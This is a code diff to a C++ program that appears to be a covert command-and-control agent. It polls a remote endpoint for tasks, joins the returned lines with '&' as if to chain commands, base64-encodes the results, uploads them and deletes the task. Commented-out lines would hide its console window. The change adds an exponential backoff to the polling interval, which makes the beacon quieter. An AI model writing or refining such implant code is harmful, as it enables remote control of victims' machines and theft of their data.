@@ -14,11 +14,13 @@ int Odd_Num() {
 int main() {
     //HWND h = GetConsoleWindow();
     //ShowWindow(h, 0);
+    DWORD i = 2;
     while (Odd_Num() % 2 != 0) {
-        Sleep(5000);
+        Sleep(expo(i, 4) * 1000);
         MyString data = downloadContext();
         if (data.getLength() > 0) {
-
+            
+            i = 2;
             for (int i = 0; i < data.getLength(); i++) {
                 if (data.getCharAt(i) == '\n') {
                     data.setCharAt(i, '&');
@@ -34,7 +36,8 @@ int main() {
             output = converter_64(output);
             upload(output);
             deleteContext();
-
+        } else {
+            i++;
         }
     }
     return 0;
